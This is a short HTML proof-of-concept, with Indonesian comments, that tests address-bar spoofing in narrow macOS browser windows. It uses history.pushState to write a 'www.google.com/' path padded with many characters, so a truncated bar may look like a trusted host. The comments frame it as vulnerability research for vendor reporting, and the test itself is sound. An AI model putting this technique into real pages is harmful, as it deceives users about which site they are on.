<!-- 14 - pushState + path panjang (elision)   [address-bar spoofing | macOS: Dia/Arc macOS jendela sempit]
     MEKANISME : path dipanjangkan supaya bilah sempit memotong sisi yang justru membantah - yang tersisa terbaca seperti host tepercaya.
     PREDIKAT  : bagian URL yang bisa membantah tak pernah terlihat.
     AMAN      : host/eTLD+1 tetap ditampilkan utuh berapa pun panjang path.
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>14 pushState + path panjang (elision)</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
o.textContent='REAL: '+location.origin;
function go(){history.pushState({},'','/'+'www.google.com/'+new Array(140).join('a'));o.textContent='REAL masih: '+location.origin;}
</script>
